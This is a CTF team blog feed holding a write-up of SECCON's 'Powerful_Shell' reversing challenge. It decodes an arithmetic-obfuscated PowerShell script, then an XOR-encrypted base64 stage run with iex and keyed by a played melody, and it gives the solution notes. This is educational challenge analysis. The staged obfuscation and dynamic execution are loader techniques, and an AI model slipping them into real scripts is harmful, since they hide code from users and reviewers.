<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>TEAMROCKETIST</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://teamrocketist.github.io/"/>
  <updated>2017-12-10T10:07:50.433Z</updated>
  <id>https://teamrocketist.github.io/</id>
  
  <author>
    <name>TEAMROCKETIST</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>[Reverse] SECCON - Powerful_Shell</title>
    <link href="https://teamrocketist.github.io/2017/12/10/Reverse-SECCON-Powerful-Shell/"/>
    <id>https://teamrocketist.github.io/2017/12/10/Reverse-SECCON-Powerful-Shell/</id>
    <published>2017-12-10T10:03:07.000Z</published>
    <updated>2017-12-10T10:07:50.433Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br><br>Powerful_Shell<br>300 points<br>Powerful_Shell<br><br>Crack me.<br>powerful_shell.ps1-1fb3af91eafdbebf3b3efa3b84fcc10cfca21ab53db15c98797b500c739b0024<br></blockquote>

<p>Windows powershell… We started by analysing the file:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$ECCON</span>=<span class="string">""</span>;</div><div class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">3783</span>/<span class="number">291</span>);</div><div class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">6690</span>/<span class="number">669</span>);</div><div class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">776</span>-<span class="number">740</span>);</div><div class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">381</span>-<span class="number">312</span>);</div><div class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">403</span>-<span class="number">289</span>);</div><div class="line"><span class="variable">$ECCON</span>+=[char](-<span class="number">301</span>+<span class="number">415</span>);</div><div class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">143</span>-<span class="number">32</span>);</div><div class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">93594</span>/<span class="number">821</span>);</div><div class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">626</span>-<span class="number">561</span>);</div><div class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">86427</span>/<span class="number">873</span>);</div><div class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">112752</span>/<span class="number">972</span>);</div><div class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">43680</span>/<span class="number">416</span>);</div><div class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">95127</span>/<span class="number">857</span>);</div><div class="line"><span class="variable">$ECCON</span>+=[char](-<span class="number">682</span>+<span class="number">792</span>);</div><div class="line"><span class="variable">$ECCON</span>+=[char](-<span class="number">230</span>+<span class="number">310</span>);</div><div class="line"><span class="variable">$ECCON</span>+=[char](-<span class="number">732</span>+<span class="number">846</span>);</div><div class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">1027</span>-<span class="number">926</span>);</div><div class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">94044</span>/<span class="number">922</span>);</div><div class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">898</span>-<span class="number">797</span>);</div><div class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">976</span>-<span class="number">862</span>);</div><div class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">52419</span>/<span class="number">519</span>);</div><div class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">1430</span>/<span class="number">13</span>);</div><div class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">18216</span>/<span class="number">184</span>);</div><div class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">21715</span>/<span class="number">215</span>);</div><div class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">12320</span>/<span class="number">385</span>);</div><div class="line"><span class="variable">$ECCON</span>+=[char]([int][Math]::sqrt([Math]::pow(<span class="number">61</span>,<span class="number">2</span>)));</div><div class="line">.....</div><div class="line"><span class="built_in">Write-Progress</span> -Activity <span class="string">"Extracting Script"</span> -status <span class="string">"20040"</span> -percentComplete <span class="number">99</span>;</div><div class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">520</span>-<span class="number">510</span>);</div><div class="line"><span class="built_in">Write-Progress</span> -Completed -Activity <span class="string">"Extracting Script"</span>;.([ScriptBlock]::Create(<span class="variable">$ECCON</span>))</div></pre></td></tr></table></figure>
<p>As we can see we have alot of operations, it looks like something is being hidden behind those arithmetic operations, I did a python script to parse all the operation using regex:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> re</div><div class="line"><span class="keyword">from</span> math <span class="keyword">import</span> *</div><div class="line"></div><div class="line">script = <span class="string">''</span></div><div class="line">lines = open(<span class="string">'powerful_shell'</span>,<span class="string">'r'</span>).read().split(<span class="string">'\n'</span>)</div><div class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</div><div class="line">	<span class="keyword">if</span> <span class="string">'sqrt'</span> <span class="keyword">in</span> line:</div><div class="line">		op = line.replace(<span class="string">'$ECCON+=[char]([int][Math]::'</span>,<span class="string">''</span>).replace(<span class="string">'[Math]::'</span>,<span class="string">''</span>).replace(<span class="string">';'</span>,<span class="string">''</span>).replace(<span class="string">')'</span>,<span class="string">''</span>) + <span class="string">'))'</span></div><div class="line">		script += chr(int(eval(op)))</div><div class="line">	<span class="keyword">elif</span> <span class="string">'$ECCON'</span> <span class="keyword">in</span> line <span class="keyword">and</span> len(re.findall(<span class="string">r'\((-*[0-9]+.-*[0-9]+)\)'</span>, line)) &gt; <span class="number">0</span>:</div><div class="line">		op = re.findall(<span class="string">r'\((-*[0-9]+.-*[0-9]+)\)'</span>, line)[<span class="number">0</span>]</div><div class="line">		script += chr(int(eval(op)))</div><div class="line"><span class="keyword">print</span> script</div></pre></td></tr></table></figure>
<p>After extracting it we got this:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div></pre></td><td class="code"><pre><div class="line">... truncanted ...</div><div class="line"></div><div class="line"><span class="variable">$keytone</span>=@&#123;<span class="string">'a'</span>=<span class="number">261.63</span>&#125;</div><div class="line"><span class="variable">$pk</span>=<span class="string">'a'</span></div><div class="line"><span class="keyword">ForEach</span>(<span class="variable">$k</span> <span class="keyword">in</span> (<span class="string">'w'</span>,<span class="string">'s'</span>,<span class="string">'e'</span>,<span class="string">'d'</span>,<span class="string">'f'</span>,<span class="string">'t'</span>,<span class="string">'g'</span>,<span class="string">'y'</span>,<span class="string">'h'</span>,<span class="string">'u'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>))&#123;</div><div class="line">	<span class="variable">$keytone</span>+=@&#123;<span class="variable">$k</span>=<span class="variable">$keytone</span>[<span class="variable">$pk</span>]*[math]::pow(<span class="number">2</span>,<span class="number">1</span>/<span class="number">12</span>)&#125;;<span class="variable">$pk</span>=<span class="variable">$k</span>	</div><div class="line">&#125;</div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">00</span> -f <span class="number">15</span> <span class="string">"Play the secret melody."</span></div><div class="line"></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'   '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">00</span> -f <span class="number">15</span> -n <span class="string">'   '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'  '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">00</span> -f <span class="number">15</span> -n <span class="string">'   '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'   |   '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">00</span> -f <span class="number">15</span> -n <span class="string">'   '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'  '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">00</span> -f <span class="number">15</span> -n <span class="string">'   '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'  '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">00</span> -f <span class="number">15</span> -n <span class="string">'   '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> <span class="string">'   |    '</span> </div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'   '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">00</span> -f <span class="number">15</span> -n <span class="string">'   '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'  '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">00</span> -f <span class="number">15</span> -n <span class="string">'   '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'   |   '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">00</span> -f <span class="number">15</span> -n <span class="string">'   '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'  '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">00</span> -f <span class="number">15</span> -n <span class="string">'   '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'  '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">00</span> -f <span class="number">15</span> -n <span class="string">'   '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> <span class="string">'   |    '</span> </div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'   '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">00</span> -f <span class="number">15</span> -n <span class="string">' w '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'  '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">00</span> -f <span class="number">15</span> -n <span class="string">' e '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'   |   '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">00</span> -f <span class="number">15</span> -n <span class="string">' t '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'  '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">00</span> -f <span class="number">15</span> -n <span class="string">' y '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'  '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">00</span> -f <span class="number">15</span> -n <span class="string">' u '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> <span class="string">'   |    '</span> </div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'    |'</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'    |'</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'    |'</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'    |'</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'    |'</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'    |'</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'    |'</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span>  <span class="string">'    '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'  a |'</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'  s |'</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'  d |'</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'  f |'</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'  g |'</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'  h |'</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'  j |'</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span>  <span class="string">'  k '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'    |'</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'    |'</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'    |'</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'    |'</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'    |'</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'    |'</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'    |'</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span>  <span class="string">'    '</span></div><div class="line"><span class="built_in">Write-Host</span></div><div class="line"><span class="variable">$stage1</span>=@();<span class="variable">$f</span>=<span class="string">""</span>;</div><div class="line"><span class="keyword">While</span>(<span class="variable">$stage1</span>.length <span class="nomarkup">-lt</span> <span class="number">14</span>)&#123;</div><div class="line">	<span class="variable">$key</span>=(<span class="built_in">Get-Host</span>).ui.RawUI.ReadKey(<span class="string">"NoEcho,IncludeKeyDown"</span>)</div><div class="line">	<span class="variable">$k</span>=[String]<span class="variable">$key</span>.Character</div><div class="line">	<span class="variable">$f</span>+=<span class="variable">$k</span>;</div><div class="line">	<span class="keyword">If</span>(<span class="variable">$keytone</span>.Contains(<span class="variable">$k</span>))&#123;</div><div class="line">		<span class="variable">$stage1</span>+=[math]::floor(<span class="variable">$keytone</span>[<span class="variable">$k</span>])</div><div class="line">		[console]::beep(<span class="variable">$keytone</span>[<span class="variable">$k</span>],<span class="number">500</span>)</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"><span class="variable">$secret</span>=@(<span class="number">440</span>,<span class="number">440</span>,<span class="number">493</span>,<span class="number">440</span>,<span class="number">440</span>,<span class="number">493</span>,<span class="number">440</span>,<span class="number">493</span>,<span class="number">523</span>,<span class="number">493</span>,<span class="number">440</span>,<span class="number">493</span>,<span class="number">440</span>,<span class="number">349</span>)</div><div class="line"><span class="keyword">If</span>(<span class="variable">$secret</span>.length <span class="nomarkup">-eq</span> <span class="variable">$stage1</span>.length)&#123;</div><div class="line">	<span class="keyword">For</span> (<span class="variable">$i</span>=<span class="number">1</span>; <span class="variable">$i</span> <span class="nomarkup">-le</span> <span class="variable">$secret</span>.length; <span class="variable">$i</span>++) &#123;</div><div class="line">		<span class="keyword">If</span>(<span class="variable">$secret</span>[<span class="variable">$i</span>] <span class="nomarkup">-ne</span> <span class="variable">$stage1</span>[<span class="variable">$i</span>])&#123;</div><div class="line">			<span class="keyword">Exit</span></div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	x <span class="string">"Correct. Move to the next stage."</span></div><div class="line">&#125;</div><div class="line"><span class="variable">$text</span>=<span class="string">@"</span></div><div class="line"><span class="string">YkwRUxVXQ05DQ1NOE1sVVU4TUxdTThBBFVdDTUwTURVTThMqFldDQUwdUxVRTBNEFVdAQUwRUxtT</span></div><div class="line"><span class="string">TBEzFVdDQU8RUxdTbEwTNxVVQUNOEFEVUUwdQBVXQ0NOE1EWUUwRQRtVQ0FME1EVUU8RThdVTUNM</span></div><div class="line"><span class="string">EVMVUUwRFxdVQUNCE1MXU2JOE0gWV0oxSk1KTEIoExdBSDBOE0MVO0NKTkAoERVDSTFKThNNFUwR</span></div><div class="line"><span class="string">FBVINUFJTkAqExtBSjFKTBEoF08RVRdKO0NKTldKMUwRQBc1QUo7SlNgTBNRFVdJSEZCSkJAKBEV</span></div><div class="line"><span class="string">QUgzSE8RQxdMHTMVSDVDSExCKxEVQ0o9SkwRQxVOE0IWSDVBSkJAKBEVQUgzThBXFTdDRExAKhMV</span></div><div class="line"><span class="string">Q0oxTxEzFzVNSkxVSjNOE0EWN0NITE4oExdBSjFMEUUXNUNTbEwTURVVSExCKxEVQ0o9SkwRQxVO</span></div><div class="line"><span class="string">EzEWSDVBSkJAKBEVQUgzThAxFTdDREwTURVKMUpOECoVThNPFUo3U0pOE0gWThNEFUITQBdDTBFK</span></div><div class="line"><span class="string">F08RQBdMHRQVQUwTSBVOEEIVThNPFUNOE0oXTBFDF0wRQRtDTBFKFU4TQxZOExYVTUwTSBVMEUEX</span></div><div class="line"><span class="string">TxFOF0NCE0oXTBNCFU4QQRVBTB1KFU4TThdMESsXQ04TRBVMEUMVThNXFk4TQRVNTBNIFUwRFBdP</span></div><div class="line"><span class="string">EUEXQ0ITShdME0EVThBXFU4TWxVDThNKF0wRMBdMETUbQ0wRShVOE0MWThMqFU1ME0gVTBFDF08R</span></div><div class="line"><span class="string">QxdMHUMVQUwTSBVOEEEVThNNFUwRNRVBTBFJF0wRQxtME0EVTBFAF0BOE0gVQhNGF0wTKhVBTxFK</span></div><div class="line"><span class="string">F0wdMxVOEzUXQ04QSBVOE0AVTBFVFUFMEUkXTBFDG0wTQRVMETMXQE4TSBVCE0MXTBNBFU4QQRVB</span></div><div class="line"><span class="string">TB1KFU4TQxdMEVYXTBEUG0NMEUoVThNBFk4TQRVCEygXQ0wRShdPEUMXTB1DFU4TQBdDThBIFU4T</span></div><div class="line"><span class="string">SBVMESgVQUwRSRdMEUYbTBMWFUNOE0gWThNCFUITFBdDTBFKF08RQxdMHUMVThNVF0NOEEgVThNN</span></div><div class="line"><span class="string">FUwRQxVOE0IWQUwRShtME0EVTBFVF08RQxdDQhNKF0wTQRVOEEEVThM9FUNOE0oXTBFFF0wRKBtD</span></div><div class="line"><span class="string">TBFKFU4TQRZOE0EVQhNAF0NMEUoXTxFDF0wdVRVOEzMXQ04QSBVOE00VTBFVFU4TQRZBTBFKG0wT</span></div><div class="line"><span class="string">RBVMESgXQE4TSBVCE0MXTBNBFU4QKhVBTB1KFU4TFBdMEUIXQ04TRBVMEUMVThNBFk4TNxVNTBNI</span></div><div class="line"><span class="string">FUwRQxdPEUMXTB01FUFME0gVThBBFU4TTRVMERQVQUwRSRdMEUMbTBNBFUwRQxdAThNIFUITQxdM</span></div><div class="line"><span class="string">E0EVThAxFUFMHUoVThNDF0wRVhdMEVUbQ0wRShVOE0QWThMWFU1ME0gVTBFDF08RRhdDQhNKF0wT</span></div><div class="line"><span class="string">QRVOEFcVQUwdShVOE0EXTBFFF0NOE0QVTBFDFU4TVxZOEyoVTUwTSBVMETMXTxFVF0NCE0oXTBNE</span></div><div class="line"><span class="string">FU4QQhVBTB1KFU4TQBdMERcXQ04TRBVMEUAVThNDFkFMEUobTBNCFUwRQRdAThNIFUITQRdMExYV</span></div><div class="line"><span class="string">QU8RShdMHUEVThNOF0NOEEgVThNIFUwRKBVBTBFJF0wRMxtMEzcVQ04TSBZOE0EVQhNVF0wTQRVB</span></div><div class="line"><span class="string">TxFKF0wdQxVOE0MXTBFFF0NOE0QVTBFGFU4TKhZBTBFKG0wTRBVMERQXQE4TSBVCE04XTBNXFUFP</span></div><div class="line"><span class="string">EUoXTB0zFU4TThdDThBIFU4TTRVMEUMVThMWFkFMEUobTBNCFUwRFBdAThNIFUITQxdME0EVThAx</span></div><div class="line"><span class="string">FUFMHUoVThNGF0wRQxdDThNEFUwRQRVOEyoWQUwRShtMEzcVTBFDF0BOE0gVQhMzF0wTFhVBTxFK</span></div><div class="line"><span class="string">F0wdMxVOExQXQ04QSBVOE0gVTBEUFUFMEUkXTBEzG0wTQRVDThNIFk4TQRVCEygXTBNEFUFPEUoX</span></div><div class="line"><span class="string">TB1DFU4TRhdDThBIFU4TTRVMEVUVQUwRSRdMERQbQ0wRShVOE0wWThNDFU1ME0gVTBFDF08RQxdM</span></div><div class="line"><span class="string">HTMVQUwTSBVOEEEVThNbFUwRNRVBTBFJF0wRQxtME0EVTBFAF0BOE0gVQhNDF0wTVxVOEEEVQUwd</span></div><div class="line"><span class="string">ShVOEzMXTBE2F0NOE0QVTBFBFU4TKhZBTBFKG0wTQRVMEUMXTxFDF0NCE0oXTBNBFU4QQRVOEzsV</span></div><div class="line"><span class="string">Q04TShdMEUAXTBFDG0wTQhVDThNIFk4TRBVCEygXQ0wRShdPEUYXTB0UFUFME0gVThBDFU4TTRVD</span></div><div class="line"><span class="string">ThNKF0wRQBdMEUMbTBNBFUNOE0gWThNBFUITQxdME0EVQU8RShdMHUMVThNVF0wRVhdDThNEFUwR</span></div><div class="line"><span class="string">RhVOEyoWQUwRShtME0MVTBEzF0BOE0gVQhNDF0wTQRVOEEEVQUwdShVOExQXTBFNF0NOE0QVTBFG</span></div><div class="line"><span class="string">FU4TRBZBTBFKG0wTRBVMERQXQE4TSBVCEzUXTBMWFUFPEUoXTB1DFU4TRhdDThBIFU4TTRVMEVUV</span></div><div class="line"><span class="string">QUwRSRdMERQbQ0wRShVOE0wWThNDFU1ME0gVTBFDF08RQxdMHTMVQUwTSBVOEEEVThNbFUwRNRVB</span></div><div class="line"><span class="string">TBFJF0wRQxtME0EVTBFAF0BOE0gVQhNDF0wTVxVOEEEVQUwdShVOEzMXTBE2F0NOE0QVTBFBFU4T</span></div><div class="line"><span class="string">KhZBTBFKG0wTQRVMEUMXTxFDF0NCE0oXTBNBFU4QQRVOEzsVQ04TShdMEUAXTBFDG0wTQhVDThNI</span></div><div class="line"><span class="string">Fk4TRBVCEygXQ0wRShdPEUYXTB0zFUFME0gVThBMFU4TSBVDThNKF0wRQxdMERQbQ0wRShVOE0IW</span></div><div class="line"><span class="string">ThNDFU1ME0gVTBFAF08RQRdDQhNKF0wTQxVOEBYVQUwdShVOE0EXTBFNF0NOE0QVTBFDFU4TKhZO</span></div><div class="line"><span class="string">E0QVTUwTSBVMEUYXTxFAF0NCE0oXTBNCFU4QFhVBTB1KFU4TQBdMEUIXQ04TRBVMEUAVThNDFkFM</span></div><div class="line"><span class="string">EUobTBNDFUwRFBdAThNIFUITQRdME0wVQU8RShdMHUMVThMoF0wRNhdDThNEFUwRRhVOEzEWQUwR</span></div><div class="line"><span class="string">ShtME0EVTBFGF0BOE0gVQhNDF0wTVxVBTxFKF0wdQxVOEygXTBE2FxROE10VShZOTBFTF2E=</span></div><div class="line"><span class="string">"@</span></div><div class="line"></div><div class="line"><span class="variable">$plain</span>=@()</div><div class="line"><span class="variable">$byteString</span> = [System.Convert]::FromBase64String(<span class="variable">$text</span>)</div><div class="line"><span class="variable">$xordData</span> = $(<span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> <span class="nomarkup">-lt</span> <span class="variable">$byteString</span>.length; ) &#123;</div><div class="line">	<span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> <span class="nomarkup">-lt</span> <span class="variable">$f</span>.length; <span class="variable">$j</span>++) &#123;</div><div class="line">		<span class="variable">$plain</span>+=<span class="variable">$byteString</span>[<span class="variable">$i</span>] -bxor <span class="variable">$f</span>[<span class="variable">$j</span>]</div><div class="line">		<span class="variable">$i</span>++</div><div class="line">		<span class="keyword">if</span> (<span class="variable">$i</span> <span class="nomarkup">-ge</span> <span class="variable">$byteString</span>.Length) &#123;</div><div class="line">			<span class="variable">$j</span> = <span class="variable">$f</span>.length</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;)</div><div class="line">iex([System.Text.Encoding]::ASCII.GetString(<span class="variable">$plain</span>))</div></pre></td></tr></table></figure>
<p>I removed some of the beginning of the script, it was useless code and was just printing some things to the screen, continuing with the rest we have more two steps to conclude, the first one was to play the piano accordantly to the key in the code <code>440,440,493,440,440,493,440,493,523,493,440,493,440,349</code>.</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">While</span>(<span class="variable">$stage1</span>.length <span class="nomarkup">-lt</span> <span class="number">14</span>)&#123;</div><div class="line">	<span class="variable">$key</span>=(<span class="built_in">Get-Host</span>).ui.RawUI.ReadKey(<span class="string">"NoEcho,IncludeKeyDown"</span>)</div><div class="line">	<span class="variable">$k</span>=[String]<span class="variable">$key</span>.Character</div><div class="line">	<span class="variable">$f</span>+=<span class="variable">$k</span>;</div><div class="line">	<span class="keyword">If</span>(<span class="variable">$keytone</span>.Contains(<span class="variable">$k</span>))&#123;</div><div class="line">		<span class="variable">$stage1</span>+=[math]::floor(<span class="variable">$keytone</span>[<span class="variable">$k</span>])</div><div class="line">		<span class="built_in">Write-Host</span> ([math]::floor(<span class="variable">$keytone</span>[<span class="variable">$k</span>])).toString(),<span class="variable">$k</span></div><div class="line">		[console]::beep(<span class="variable">$keytone</span>[<span class="variable">$k</span>],<span class="number">500</span>)</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
